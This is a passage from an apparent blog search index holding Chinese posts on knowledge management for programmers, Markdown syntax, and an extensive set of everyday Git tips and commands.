给带入坑的。写博客的好处我就不提了，看上面两篇文章就够洗脑了。下面我着重谈谈如何写好博客的一点个人经验。\n **博客少写纯操作指南类的文章。**网上大部分博客写的都是纯操作指南类的文章，例如，如何搭建 LAMP 之类，可能作者自己都不清楚为什么要这么做。不是说纯操作指南类的文章不好，相反我觉得这种文章很重要，只是它的位置不对。它应该放在 wiki 中，因为纯操作指南类的文章只是描述步骤，关注点是怎么做，而不是为什么。写博客的关注点应该在为什么，讲清楚为什么要这么做。另外不要钻牛角尖，我说的是纯操作指南，不要以为只要是搭建环境之类的文章都不能写，这里的“纯”代表只给步骤，不提背后的原理。其实写得好的操作指南应该力求让读者知其然，知其所以然。 定期写文章。 万事开头难，动笔开始写作很难，一旦开始就停不下来了。养成定期写文章的习惯，至少确保一个月一篇的节奏。 **自荐文章到各个技术头条。**例如说：伯乐头条，开发者头条，极客头条等，有读者才有动力，同时也是保证自己写好文章的监督。 **写博客的工具。**我自己用的是托管在 ECS的 Hexo 静态博客。搭建教程见 用hexo搭建github博客。如果你有服务器的话，可以试试 wordpress，ghost 之类的博客软件，当然推荐页面简洁高大上的hexo了 **把无法加工的知识写到 Wiki。**例如说：git 的一些配置和用法，这些内容在官方文档都能找到，写在博客也只是搬运工，除非你有新的理解。  总结 以上是我摸打滚爬两年多积累的经验之谈，如果你有好的经验欢迎留言交流。一开始我是在51CTO 写博客，只不过走了不少弯路，后来折腾 个人hexo博客，最后又开了 个人 Wiki,接着转移至hugo。逐渐形成了自己的知识管理方法。最后总结一下：\n 知识积累：使用笔记软件保存好的文章，积累知识。 碎片整理：在个人 wiki 上记录初步消化的知识碎片。 思考加工：对存在笔记和 wiki 中知识进行思考加工后写在博客。  以上讲的是如何在互联网中学习积累，但是千万不要忽视了看书这一重要方法，书中的知识是成体系的，知识密度高，网上的文章良莠不齐，不成体系，比较碎片化。合理分配时间看书和上网学习是很重要的。\nrelated [程序员的知识管理]\n","permalink":"https://www.fenghong.tech/blog/technology/manage-knowledge/","tags":["knowledge","manage"],"title":"程序员的知识管理"},{"categories":["tools"],"contents":"[TOC]\nMarkdown 是一种轻量级的标记语言，其用简单的标记语法便可达到排版的目的，其可以使我们更加专注于内容的编写，而不需过多关注排版。本文主要整理了 Markdown 中的常用的标记语法，以便自己与他人以后查用。\nHexo是基于Github的博客平台，Github中的文本格式是.md，那么用Hexo写博客也必然要用到Markdown。本文首先带你选择适合你的Markdown编辑器(推荐Atom)，然后对Markdown语法做一简要介绍。\nMarkdown编辑器 支持Markdown的编辑器有好多，功能也不完全一致，有的是用来进行基本的写作，有的是用来写代码的，有的甚至只是博客平台配套的编辑器。想了解好用的Markdown编辑器，可以点开链接。\n根据我个人的需求，我使用Typora作为本地Markdown编辑器，使用发布文章，与我的博客同步更新。这里要安利一波Typora！\nMarkdown语法介绍  献给写作者的 Markdown 新手指南：必推的小白入门教程，跟着做一遍就可以上手写文章啦~ Markdown 语法说明(简体中文版)：进阶教程，分为快速入门和完整语法说明两版，给web开发者的Markdown教程，需要有HTML基础 本文的Markdown语法介绍  段落元素 1、段落与换行 Markdown 中的段落指连续的一段文字，编写时段落之间用至少一个空行隔开，段落内多个空格将被视为一个空格，段首不支持缩进。\n如果想要在显示时显示多个空行，可以插入 \u0026lt;br/\u0026gt; 来实现，注意的是，插入的 \u0026lt;br/\u0026gt; 应与前后的段落中间至少空一行。\n2、标题 Markdown 支持两种类型的标题。\n//类型 1 这是一级标题 ========== 这是二级标题 ---------- //类型 2 # 这是一级标题 ## 这是二级标题 ... ###### 这是六级标题 从上面可以看出类型 1 是在标题下面插入 = 或者 - 来标识标题等级，但局限是其只能表示两个级别的标题。\n类型 2 是在标题前面插入 1 - 6 个 # ，表示 6 个等级的标题，这是比较推荐的用法。\n3、引用 Markdown 中使用 \u0026gt; 来引用。我们可以在一段文字中的每行开头加上 \u0026gt; 来表示一段引用文字，也可以只在一段文字的开头插入一个 \u0026gt; 来表示，如下面的 1、2 两种方式：\n//方式 1 \u0026gt; 这是一句话 \u0026gt; 这是第二句话 //方式 2 \u0026gt; 这是一句话 这是第二句话 Markdown 支持使用不同数量的 \u0026gt; 表示嵌套引用。\n\u0026gt; 这是外层的引用 \u0026gt; \u0026gt; 这是内层的引用 4、无序列表 无序列表使用 -、 + 或 * 来作为标记。\n- 第一项 - 第二项 - 第三项 上面的 - 可以用 +、 *替换。需要注意的是，- 等符号与后面的文字至少空一格空格。\n5、有序列表 有序列表使用数字和紧挨着的点号表示。\n1. 第一项 2. 第二项 3. 第三项 同无序列表一样，标记符号与后面的文字至少空一格空格。但编辑时的数字对显示无影响。\n2. 第一项 6. 第二项 1. 第三项 上面的例子与前一个显示的结果完全一致，但建议编辑时按照数字顺序。\n列表  有序列表和无序列表的每一项中均可嵌套其他列表； 在列表项之间要插入段落时，这时需要将列表项之间的段落缩进 4 个空格； 使用 1\\. 来输出 1.;  6、代码区块 缩进 4 个空格，需要注意的是，每行代码都需要至少缩进 4 个空格，不能像段落一样采用首行标记的偷懒写法，一个代码区会一直持续到没有缩进 4 个空格的那一行。\n也可以用一对三个连续的撇号 `` `来包裹代码段。\ncode 有的解释器还能根据代码的语言从而给代码加上语法高亮。\nfunction func() {} 7、分割线 使用三个及以上的 *、 - 或 _来表示一个分割线，符号不能混用，符号之间可以插入多个空格。需要注意的是，使用 - 来插入分割线时需要与上一个段落至少空一行，否则 Markdown 会将上一行文字解释为二级标题。\n8、表格 表格是 Markdown 比较复杂的一种表示。\n| Table | Col1 | Col2 | | ----- |:----:| ----:| | Row1 | 1-1 | 1-2 | | Row2 | 2-1 | 2-2 | | Row3 | 3-1 | 3-2 | 上面第二行中的点代表对齐方式，分别是默认（居右）、居中、居左。\n 行内元素 9、超链接 Markdown 中有三种方式实现超链接。\n//方式 1 [百度](http://www.baidu.com) //方式 2 [百度][Baidu-url] [Baidu-url]: http://www.baidu.com 方式 1 较为常用，也可以为链接的文字加上提示文字，只要在括号中超链接加上空格后添加提示内容即可。\n[百度](http://www.baidu.com \u0026quot;这是提示文字\u0026quot;) 方式 2 由链接文字和链接地址组成，不同的是两者均由 [] 包裹。链接地址的格式为：\n 方括号，里面输入链接地址； 紧接着是一个冒号； 冒号后面至少一个空格； 链接地址； 若有提示文字，空格后用引号或者括号包裹提示文字。  下面是完整示例：\n[百度][Baidu-url] [Baidu-url]: http://www.baidu.com \u0026quot;这是提示文字\u0026quot; 第三种方式是用 \u0026lt;\u0026gt; 来包裹 URL。\n//方式 3 \u0026lt;http://www.baidu.com\u0026gt; 10、加粗和斜体 Markdown 使用 * 和 _ 来表示粗体和斜体。\n//加粗 **这是加粗文字** __这也是加粗文字__ //斜体 *这是斜体文字* _这也是斜体文字_ 被偶数个 * 或 _ 包裹的文字显示加粗效果，被奇数个包裹的为倾斜效果。\n需要注意的是，* 和 - 要成对出现，不能混合使用，也不能只出现一个。同时，标识符号要与标识的文字紧挨着，符号与符号之间、符号文字之间不能有任何空格。\n11、代码 使用 `` `(撇号) 来包裹一小段代码。\n`Hello world.` 若想在代码中添加撇号，可以使用多个撇号包裹里面需要添加的撇号，但注意里面的连续的撇号数量不能超过外面的数量。\n//显示一个撇号 `` ` `` 12、图片 图片的插入方式跟超链接前两种插入方式类似。\n//方式 1 ![如果图片不能显示，就显示这段文字](图片 url) //方式 2 ![如果图片不能显示，就显示这段文字][Image-url] [Image-url]: 图片url \u0026quot;这是提示文字\u0026quot; 反斜杠 \\ 我们经常需要在文章中插入一些特殊符号，而这些符号恰好是前面所讲的标识符号，可以在特殊符号前插入 \\ 来直接显示符号，而不让 Markdown 来将其解释为标识符号。\nMarkdown 支持以下这些符号前插入 \\ 而显示其本来样子：\n\\ 反斜线 ` 反引号 * 星号 _ 底线 {} 花括号 [] 方括号 () 括弧 # 井字号 + 加号 - 减号 . 英文句点 ! 惊叹号 拓展 其实，市场上有很多的 Markdown 解释器，它们大都能支持上面所讲的语法，但呈现出的样式往往不一。另外，不同的解释器还能支持其他自己定义的语法，比如 Github 还能支持 emoji。下面再着重介绍 Github 支持的几个 Markdown 语法。不过需要注意的是，有些语法只能在 issue 或者 pull request 上使用，这个在后面讲每个语法时会标记（约定：“通用”表示在 Github 任何地方可以使用的语法，“特殊”表示只能在 issue 或者 pull request 上使用）。\n语法高亮(通用)  上面说过，有的解释器是能够显示语法高亮的，Github 就可以。\n任务列表（通用） - [ ] task one - [x] task two 用法跟普通列表的用法差不多，只不过在每一项文字前面加了 [ ] 或者 [x]。[ ] 中间有且只有一个空格，表示未完成，另一个表示已完成。\n表格（通用） Github 支持更简单的 table 语法。\nFirst Header | Second Header ------------ | ------------- Content from cell 1 | Content from cell 2 Content in the first column | Content in the second column 表头与项用一排 - 分隔开，每一列用 | 分隔开。\nSHA 引用（特殊） 每一次 commit 都会产生一个 id，用 @id 的方式可以链接到某个项目的特定的 commit。比如用 jquery/jquery@1b9575b9d14399e9426b9eacdd92b3717846c3f2 就能链接到 jquery 的一次 commit 记录上。\nissue 引用（特殊） 用 #1 来引用当前 repo 的第一个 issue，也可以用 jquery/jquery#1 引用 jquery 的第一次 issue。\n@（特殊） 用 @ 来提醒目标用户。比如 @CompileYouth 可以 @ 到我。\n删除符号（通用） 用连续两个 ~ 包围的词会被加上删除符。比如 ~~This is removed~~。\nEmoji（通用） Github 比较有意思的是可以支持 emoji。比如 :smile: 表示笑脸等等，具体可以查看 Emoji Cheat Sheet\n详细信息可以查看官方文档。最后 po 两张 Github 官方推荐的 Markdown Cheat Sheet：通用语法，Github 支持语法\n","permalink":"https://www.fenghong.tech/blog/tools/markdown/","tags":["markdown"],"title":"Markdown"},{"categories":["ops"],"contents":"[TOC]\nGit的help信息非常好，很多可以直接help来了解\n给Git输出信息增加颜色 编辑~/.gitconfig 比如要对git status设置颜色，可以:\n[color] ui = auto [color \u0026quot;branch\u0026quot;] current = yellow reverse local = yellow remote = green [color \u0026quot;diff\u0026quot;] meta = yellow bold frag = magenta bold old = red bold new = green bold [color \u0026quot;status\u0026quot;] added = yellow changed = green untracked = cyan 参考:\n How to show git colors on zsh Enabling git syntax highlighting for macs terminal How to colours in git  关于Git的分支 参考的 何谓分支\n因为Git是保存的快照，Git仓库有以下几个基本对象\n blob 对象用于表示文件快照内容 tree 对象记录目录树内容和各个文件对应的blob对象索引 commit 对象记录提交信息，指向tree对象或其他commit对象  Git的分支，其本质是一个指向commit对象的可变指针，Git使用master作为分支的默认名字\nHEAD指针指向当前的分支指针\n使用git branch是查看当前的分支列表\n使用git branch branch_name新建分支，然后可以使用git checkout branch_name切换分支\n最后可以用git merge branch_name来合并分支\n如果遇到冲突，需要到冲突的文件下根据提示编辑后再commit\n远程分支 参考的 远程分支\n从远程Git repo克隆，Git会自动将此remote repo命名为origin，并下载其中所有的数据，建立一个指向它的master分支的指针，在本地命名为origin/master\n但无法在本地更改其数据。接着，Git建立一个属于自己的本地master分支，始于origin上master分支相同的位置，这样可以就此开始工作\ntouch README.md git init git add README.md git commit -m \u0026quot;first commit\u0026quot; git remote add origin git@github.com:tankywoo/test.git git push -u origin master 这里origin是remote repo name，branch name 是master\n关于fetch和pull区别 What is git fetch? and what is the difference to git pull?\ngit fetch是update from remote repo，但是不合并\ngit pull是fetch and merge\nGit标签  含附注的标签(annotated) 轻量级标签(lightweight)  2.6 Git 基础 - 打标签\n删除远程标签:\ngit push origin :tagname 或\ngit push --delete origin tagname 参考\nGit 全局配置 全局忽略文件\n 忽略文件 git ignore repo  使用vimdiff 默认的diff应该是使用diff命令, 这个命令也非常有必要掌握.\n但是, 更直观的, 可以选择vimdiff.\n# 配置Git使用vimdiff来做差异比较 git config --global diff.tool vimdiff # 在merge时使用 git config --global merge.tool vimdiff # 因为在使用vimdiff时, vim会有如下提示: # Viewing: 'tkwiki/tool/git.wiki' # Launch 'vimdiff' [Y/n]: y # 可以取消这个提示 git config --global difftool.prompt false 然后就可以\ngit difftool tkwiki/tool/git.wiki 来查看修改的地方, 效果图:\n参考:\n Git and Vimdiff Using Vimdiff with Git  查看提交log git log 会查看当前git repo里所有的提交历史\ngit log filename 会查看这个文件的所有提交历史\ngit log -p -2 [filename] 会把最近的2次提交变更展开\ngit log \u0026ndash;pretty=oneline [filename] 这个太牛逼了, 只显示id和提交说明.\ngit log \u0026ndash;pretty=format:\u0026ldquo;xxxx\u0026rdquo; 这个更牛逼, 自定义查看log的输出格式\n参考:\n 查看提交历史  文件中文名问题 最近遇到同步文件下来, 中文文件名全部是unicode, 解决这个问题加配置:\ngit config --global core.quotepath false Git mv 日志问题 在 git mv (rename) 文件后, 直接 git log 只能看到这个文件被 rename 后的日志, 想要看到完整的日志, 要用 git log --follow xxx\n参考:\n Is it possible to move/rename files in git and maintain their history? What\u0026rsquo;s the purpose of git-mv?  指定路径pull 以前都是 cd 到仓库当前目录然后 pull. 因为想到 svn up 可以直接指定路径, 这种基本功能 git 肯定会有的, 但是直接指定路径不行.\n搜了下, StackOverflow 上的 回答1 和 回答2 非常给力.\nGit 的参数 --git-dir 可以指定 Git 的路径, 即使用这个 .git 的配置等来更新 repo. 但是这个会以 pwd 为要更新的 repo 路径. 所以还需要 --work-tree 来指定要更新的 repo 的路径, 而不需要 cd 过去.\ngit --git-dir=/path/to/git-repo/.git --work-tree=/path/to/git-repo/ pull 查看指定目录下的 status git status [path] 比如当前目录下的 status:\ngit status . git status - is there a way to show changes only in a specific directory?\n选择一部分修改提交 使用 git add -p filename。\n具体见:\n Git 工具 - 交互式暂存 How can I commit only part of a file in git  只从 git repo 中移除文件, 但不删除实际文件 git rm --cached file 默认使用 git rm 会把文件也一并删除掉.\n修改最后一次提交 使用:\ngit commit --amend 如果当前 stage区 没有东西, 则相当于可以修改 commit comment.\n如果 stage区 有新的文件, 比如有个文件staged后忘了和上次的提交一次commit, 则可以撤销并重新提交.\n修改commit的author 如果是staged的文件，提交时直接指定 --author 就可以了:\ngit commit -m \u0026quot;xxx\u0026quot; --author=\u0026quot;Tanky Woo \u0026lt;noreply@tankywoo.com\u0026gt;\u0026quot; 修改最后一次提交的author，可以配合 --amend:\ngit commit --amend --author=\u0026quot;Tanky Woo \u0026lt;noreply@tankywoo.com\u0026gt;\u0026quot; 如果user config配置修改了，可以直接--reset-author:\ngit commit --amend --reset-author 修改指定commit的author:\n* 2f1e828 - (HEAD, origin/test, origin/master, test, master) update test-git-submodule (2 days ago) \u0026lt;Tanky Woo\u0026gt; * 3243b09 - first commit with submodule (2 days ago) \u0026lt;Tanky Woo\u0026gt; * 5956ab0 - why conflict and merge? (3 weeks ago) \u0026lt;Tanky Woo\u0026gt; 现在想修改 3243b09 的 author name，需要从它之前的一个commit开始rebase:\nTankyWoo@Mac::test-git/ (master) » git rebase -i 5956ab0 Git 会使用设置的编辑器打开如下:\npick 3243b09 first commit with submodule pick 2f1e828 update test-git-submodule # Rebase 5956ab0..2f1e828 onto 5956ab0 # # Commands: # p, pick = use commit # r, reword = use commit, but edit the commit message # e, edit = use commit, but stop for amending # s, squash = use commit, but meld into previous commit # f, fixup = like \u0026quot;squash\u0026quot;, but discard this commit's log message # x, exec = run command (the rest of the line) using shell # # These lines can be re-ordered; they are executed from top to bottom. # # If you remove a line here THAT COMMIT WILL BE LOST. # # However, if you remove everything, the rebase will be aborted. # # Note that empty commits are commented out 根据提示，把需要修改的一行用edit替换pick:\nedit 3243b09 first commit with submodule pick 2f1e828 update test-git-submodule 保存关闭后会提示:\nStopped at 3243b09... first commit with submodule You can amend the commit now, with git commit --amend Once you are satisfied with your changes, run git rebase --continue 如果要对first commit开始做rebase:\ngit rebase -i --root 我设置的PS1的括号里是分支名，可以看到现在的分支是这个要修改的commit id:\nTankyWoo@Mac::test-git/ (3243b09*) » git commit --amend --author=\u0026quot;Tanky \u0026lt;noreply@tankywoo.com\u0026gt;\u0026quot; 修改完后会进入下一个commit id分支，直接--continue，因为604c35c这个commit设置的是pick，所以不会做改动:\nTankyWoo@Mac::test-git/ (604c35c*) » git rebase --continue Successfully rebased and updated refs/heads/master. 再查看日志:\n* 16c4757 - (HEAD, master) update test-git-submodule (2 seconds ago) \u0026lt;Tanky Woo\u0026gt; * b9fbd8a - first commit with submodule (15 seconds ago) \u0026lt;Tanky\u0026gt; * 5956ab0 - why conflict and merge? (3 weeks ago) \u0026lt;Tanky Woo\u0026gt; SO上的回答:\n For example, if your commit history is A-B-C-D-E-F with F as HEAD, and you want to change the author of C and D, then you would\u0026hellip;\n Specify git rebase -i B change the lines for both C and D to edit Once the rebase started, it would first pause at C You would git commit --amend --author=\u0026quot;Author Name \u0026lt;email@address.com\u0026gt;\u0026quot; Then git rebase --continue It would pause again at D Then you would git commit --amend --author=\u0026quot;Author Name \u0026lt;email@address.com\u0026gt;\u0026quot; again git rebase --continue The rebase would complete.   如果要修改指定用户全部commit的author:\ngit filter-branch -f --env-filter ' an=\u0026quot;$GIT_AUTHOR_NAME\u0026quot; am=\u0026quot;$GIT_AUTHOR_EMAIL\u0026quot; cn=\u0026quot;$GIT_COMMITTER_NAME\u0026quot; cm=\u0026quot;$GIT_COMMITTER_EMAIL\u0026quot; if [ \u0026quot;$GIT_COMMITTER_EMAIL\u0026quot; = \u0026quot;\u0026lt;OLD EMAIL\u0026gt;\u0026quot; ] ; then cn=\u0026quot;\u0026lt;NEW NAME\u0026gt;\u0026quot; cm=\u0026quot;\u0026lt;NEW EMAIL\u0026gt;\u0026quot; export GIT_COMMITTER_NAME=\u0026quot;$cn\u0026quot; export GIT_COMMITTER_EMAIL=\u0026quot;$cm\u0026quot; fi if [ \u0026quot;$GIT_AUTHOR_EMAIL\u0026quot; = \u0026quot;\u0026lt;OLD EMAIL\u0026gt;\u0026quot; ] ; then an=\u0026quot;\u0026lt;NEW NAME\u0026gt;\u0026quot; am=\u0026quot;\u0026lt;NEW EMAIL\u0026gt;\u0026quot; export GIT_AUTHOR_NAME=\u0026quot;$an\u0026quot; export GIT_AUTHOR_EMAIL=\u0026quot;$am\u0026quot; fi ' 这个在github官方help里也有脚本。\nStackOverflow上有两篇讨论非常好:\n How do I change the author of a commit in git? Change commit author at one specific commit  （2017-12-20补充）\n强制同步远程并覆盖本地历史。\n比如某个项目，用如上方法修改了所有提交的用户名和邮箱，然后想更新线上一批机器的这个项目。第一个是想到 git pull --force，但是此方法会做一个合并，所以不行；另外想到 git fetch; git merge -X theirs master 也不行。\n后来搜到 这个回答：\ngit fetch git reset --hard origin/master 首先在线上环境这种只做 clone、pull 等操作（核心是 fetch），如果没有异同，则没有 .git/refs/remote/origin/master 文件（指向远程的最新 commit id）。\n如果有异同，如上修改了提交者姓名和邮箱，会生成 origin/master，然后 git reset 即将当前 head 变更为指定的状态，也就是远程更新后的。\nGit diff 技巧 (待整理)\ngit diff tag 比较tag和HEAD之间的不同。 git diff tag file 比较一个文件在两者之间的不同。 git diff tag1..tag2 比较两个tag之间的不同。 git diff SHA11..SHA12 比较两个提交之间的不同。 git diff tag1 tag2 file or git diff tag1:file tag2:file 比较一个文件在两个tag之间的不同。 ORIG_HEAD 用于指向前一个操作状态，因此在git pull之后如果想得到pull的 内容就可以：\ngit diff ORIG_HEAD git diff --stat 用于生成统计信息。 git diff --stat ORIG_HEAD HEAD vs ORIG_HEAD 关于 HEAD 和 ORIG_HEAD 的区别，来至StackOverflow的回答:\n HEAD is (direct or indirect, i.e. symbolic) reference to the current commit. It is a commit that you have checked in the working directory (unless you made some changes, or equivalent), and it is a commit on top of which \u0026ldquo;git commit\u0026rdquo; would make a new one. Usually HEAD is symbolic reference to some other named branch; this branch is currently checked out branch, or current branch. HEAD can also point directly to a commit; this state is called \u0026ldquo;detached HEAD\u0026rdquo;, and can be understood as being on unnamed, anonymous branch.\nORIG_HEAD is previous state of HEAD, set by commands that have possibly dangerous behavior, to be easy to revert them. It is less useful now that Git has reflog: HEAD@{1} is roughly equivalent to ORIG_HEAD (HEAD@{1} is always last value of HEAD, ORIG_HEAD is last value of HEAD before dangerous operation).\n For more information read git(1) manpage, Git User\u0026rsquo;s Manual, the Git Community Book and Git Glossary\n其它的一些讲解:\n ORIG_HEAD, FETCH_HEAD, MERGE_HEAD etc GIT基本概念和用法总结  git revert/reset/checkout 区别 讲得挺好的一篇 Undoing Git Changes，关于git checkout, git revert,git reset, git clean 的对比。\n统计每个提交者的提交次数 git shortlog --numbered --summary git reflog TODO\ngit cherry-pick TODO\nGit Commit Message 基本准则 一些基本的准则:\n  commmit时不建议使用-m/--message，这样能提交的信息太简单的；建议直接commit通过编辑器来撰写message.\n  第一行不超过50个字符，作为简单的描述，第二行为空行，第三行开始再做详细描述，例子(http://git-scm.com/book/ch5-2.html):\nShort (50 chars or less) summary of changes More detailed explanatory text, if necessary. Wrap it to about 72 characters or so. In some contexts, the first line is treated as the subject of an email and the rest of the text as the body. The blank line separating the summary from the body is critical (unless you omit the body entirely); tools like rebase can get confused if you run the two together. Further paragraphs come after blank lines. - Bullet points are okay, too - Typically a hyphen or asterisk is used for the bullet, preceded by a single space, with blank lines in between, but conventions vary here   第一行 结尾不要用句号，这个可以认为是一个标题\n  第三行 开始的详细描述长度不超过72个字符\n  使用 git diff --check 对无用的空白做检查:\n--check -- warn if changes introduce trailing whitespace or space/tab indents   使用 fix, add, change 而不是 fixed, added, changed\n Write the summary line and description of what you have done in the imperative mode, that is as if you were commanding someone. Write \u0026ldquo;fix\u0026rdquo;, \u0026ldquo;add\u0026rdquo;, \u0026ldquo;change\u0026rdquo; instead of \u0026ldquo;fixed\u0026rdquo;, \u0026ldquo;added\u0026rdquo;, \u0026ldquo;changed\u0026rdquo;.\n   尽量使用英文提交\n  针对Github，在commit message中使用 #id(id 为具体issue的标号)，可以把message关联到具体的issue\n  可以看看Git源码的提交log : https://git.kernel.org/cgit/git/git.git/log/\n一些不错的文章:\n 5 Useful Tips For A Better Commit Message Git commit 注释格式 http://www.fwolf.com/blog/post/14 Writing good commit messages Distributed Git - Contributing to a Project  git add 只添加 tracked 的文件 git add 有一个 -u 选项，会只添加tracked的文件，比如在项目根目录下，可以添加所有修改过的已经tracked的文件:\ngit add -u . 如果单纯的git add . 会把untracked的文件也加进去\n删除untracked files git clean -f But beware\u0026hellip; there\u0026rsquo;s no going back. Use -n or \u0026ndash;dry-run to preview the damage you\u0026rsquo;ll do.\nIf you want to also remove directories, run git clean -f -d\nIf you just want to remove ignored files, run git clean -f -X\nIf you want to remove ignored as well as non-ignored files, run git clean -f -x\nNote the case difference on the X for the two latter commands.\nIf clean.requireForce is set to \u0026ldquo;true\u0026rdquo; (the default) in your configuration, then unless you specify -f nothing will actually happen, with a recent enough version of git.\nSee the git-clean docs for more information.\nfrom\n同一个文件选择部分提交 You can do git add -p filename, and it\u0026rsquo;ll ask you what you want to stage. You can then:\n hit s to split whatever change into smaller hunks. This only works if there is at least one unchanged line in the \u0026ldquo;middle\u0026rdquo; of the hunk, which is where the hunk will be split then hit either:  y to stage that hunk, or n to not stage that hunk, or e to manually edit the hunk (useful when git can\u0026rsquo;t split it automatically)   and d to exit or go to the next file. Use ? to get the whole list of available options.  If the file is not in the repository yet, do first git add -N filename. Afterwards you can go on with git add -p filename.\nSource\ncheckout 指定的 tag git checkout tags/\u0026lt;tag_name\u0026gt; 参考\ngit add的几个参数和通配符  git add . stages new and modified, in Git 1.x, without deleted, in Git 2.x, with deleted git add -u stages modified and deleted, without new git add -A stages All git add * stages new(except name begin with dot) and modified, without deleted  这里得注意, git add . 在 Git 1.x 和 Git 2.0以后是不一样的.\n详细讨论见:\n Difference between “git add -A” and “git add .” git add * (asterisk) vs git add . (period)  检查repo是否dirty git status --porcelain 关于git提示的状态, 见man git-status的 [OUTPUT] -\u0026gt; [Short Format] 一节\n参考:\n Checking for a dirty index or untracked files with Git How can I check in a bash script if my local git repo has changes How do I programmatically determine if there are uncommited changes?  检查repo当前HEAD是否提示ahead或behind远程仓库分支 比如像这样的:\n$ /opt/nlo/nginx# git status # On branch master # Your branch is ahead of 'origin/master' by 13 commits. # nothing to commit (working directory clean) 使用:\ngit rev-list --left-right --count origin/master...master 将master与远程仓库origin/master作比较.\n如果master的HEAD比origin/master新则报ahead, 否则behind.\n返回结果格式是:\n{behind}\\t{ahead} 参考:\n git: programmatically know by how much the branch is ahead/behind a remote branch git ahead/behind info between master and branch? git-branch-status  获取当前分支名 在Git 1.8及以后:\n$ git symbolic-ref --short HEAD Git 1.7+:\n$ git rev-parse --abbrev-ref HEAD 参考\n删除分支 远程分支被删除后(如Github在页面上删除分支), 本地删除追踪分支:\ngit fetch -p 定期清除远程分支和本地已合并分支是一个好习惯，否则有时会遇到这种本地refs冲突:\n$ git pull remote: Counting objects: 3, done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0) Unpacking objects: 100% (3/3), done. error: cannot lock ref 'refs/remotes/origin/feature/new': 'refs/remotes/origin/feature' exists; cannot create 'refs/remotes/origin/feature/new' From git.coding.net:tankywoo/test-repo ! [new branch] feature/new -\u0026gt; origin/feature/new (unable to update local ref) error: some local refs could not be updated; try running 'git remote prune origin' to remove any old, conflicting branches 因为远程有一个老的分支叫feature在本地有refs, 现在又有一个新的分支叫feature/new, 这样就没法在系统上建立refs目录了。\n提示已经很清楚了, 请出指定remote的stale分支, 即远程分支已被删除(上面那条命令效果类似，不过在清除的时候还会下拉新的分支)。\ngit remote prune origin Git本地设置某个远程库readonly 如Github, Gitlab等可以在页面上设置某个用户的权限. 不过有时为了防止出问题, 在本地也可以设置.\n其实就是简单的将remote url的push地址重写为任意字符串.\n$ git remote set-url --push origin 'do not push' 关于 HEAD^ 和 HEAD~ 的区别 HEAD^ 表示当前分支的第一个父分支的第一个点, 等同于 HEAD^1; HEAD^2表示第二个父分支的第一个点\nHEAD~1 表示当前分支的第一个父分支的第一个点, 等同于 HEAD~1, 效果也等同于 HEAD^; HEAD~2表示第一个父分支的第二个点.\nstackoverflow上这个回答描述的很详细:\nG H I J \\ / \\ / D E F \\ | / \\ \\ | / | \\|/ | B C \\ / \\ / A A = = A^0 B = A^ = A^1 = A~1 C = A^2 = A^2 D = A^^ = A^1^1 = A~2 E = B^2 = A^^2 F = B^3 = A^^3 G = A^^^ = A^1^1^1 = A~3 H = D^2 = B^^2 = A^^^2 = A~2^2 I = F^ = B^3^ = A^^3^ J = F^2 = B^3^2 = A^^3^2 其它讲解:\n head where are we where were we  查看两个分支的差异 遇到一个问题, 删除一个已合并分支时, 提示此分支没有完全合并:\n error: The branch \u0026lsquo;xxx\u0026rsquo; is not fully merged\n 在so上发现一个给力的回答\n$ git log --graph --left-right --cherry-pick --oneline master...experiment 查看某个commit在哪些release(tag)引进 之前考虑的是知道某个commit, 这时就知道它的提交时间, 然后找出release/tag在它之后即可, 也就是:\n$ git log --tags --simplify-by-decoration --pretty=\u0026quot;format:%ai %d\u0026quot; 然后根据commit的提交时间找到从那个tag开始有.\n不过后来想了下, 这块有问题, 因为当前发布分支不一定merge了这个commit.\n后来搜到git tag有这个功能--contains选项:\n$ git tag --contains \u0026lt;commit id\u0026gt; 延伸下: 如果查看哪些分支包含某个指定commit id:\n$ git branch --contains \u0026lt;commit id\u0026gt; Git subtree \u0026amp; submodule 对submodule的使用应该是非常熟悉了. 听过subtree这个东西有1、2年了, 一直没时间去了解, 前阵子简单了解过, 今晚又看了下文档和一些博客并尝试了(2015-11-11, 好吧, 双十一, 刚剁手完~~~), 也算大致有了一个了解认识.\n首先说一下, 国内很多博客人云亦云, 都没什么实践场景, 就跟着别人说: submodule太复杂, 不好用, 应该用subtree. 这个是相当坑爹的.\n然后放几个链接, 技术上就不详细说明:\n man git-subtree git subtrees: a tutorial 很好的入门资料, 详细的例子 Alternatives To Git Submodule: Git Subtree Git submodule 还是 Git Subtree 评价还算中肯 使用GIT SUBTREE集成项目到子目录 里面提到的一些链接文章可以看看  简单说下使用(merge和split还没去尝试):\ngit subtree add -P \u0026lt;prefix\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;ref\u0026gt; git subtree pull -P \u0026lt;prefix\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;ref\u0026gt; git subtree push -P \u0026lt;prefix\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;ref\u0026gt; subtree add命令将一个项目拉到本地作为一个子目录, 这个和submodule类似. prefix执行子目录名.\n子仓库独立更新, 主仓库使用subtree pull命令下拉作更新, 会产生一个merge commit\n主仓库下子目录的仓库作了更新, 可以使用subtree push将修改推到子仓库\n子仓库可以修改并提交, 这个提交是在主仓库历史可以直接git log看到的(不同于submodule)\n因为每次都要敲repository, 可以把这个用git remote增加一个remote alias.\n建议:\n subtree pull建议加上--squash, 将子仓库的多个提交合并为一个提交merge到主仓库, 否则会增加一堆commit. 主仓库的修改和子仓库的修改分开提交, 主库和子库互相pull/push时会比较混乱  实例:\n Deploying a subfolder to GitHub Pages Jekyll可以用到的一个例子.  感受:\n 至少目前来说, 我还是喜欢submodule 说submodule麻烦是因为不了解, 有人说需要.gitmodule配置文件, 我觉得这个的优点之一就是简化文件, 不然每次都要敲prefix, repository很麻烦不是? subtree导致历史看起来比较脏, 对于submodule, 主库一个逻辑提交可以直接包含子库的相应commit id即可 subtree对于一些小项目比较合适 subtree依赖使用团队的规范约束, 否则历史容易乱.  当然, 上面也只是我了解一些皮毛的感受, 希望后续有机会能更多的去实践.\n另外, submodule的教程:\n Git Submodule使用完整教程  关于子模块：\ngit submodule status可以用于查看子模块的状态：\n$ git submodule status abf682ed9f412b28e3147e6774b2dc3daa96efbd themes/yasimple (heads/master) +a26442b58f9d709802af7e07d95657a7ddf3194c themes/yasimple_x2 (heads/master) 其中SHA-1 hash前的flag表示状态：-表示模板在本地没有初始化; +表示子模块的HEAD和被引入的id不一致，即有新的提交没有合并到仓库里。\n撤销子模块在本地的注册：\n$ git submodule 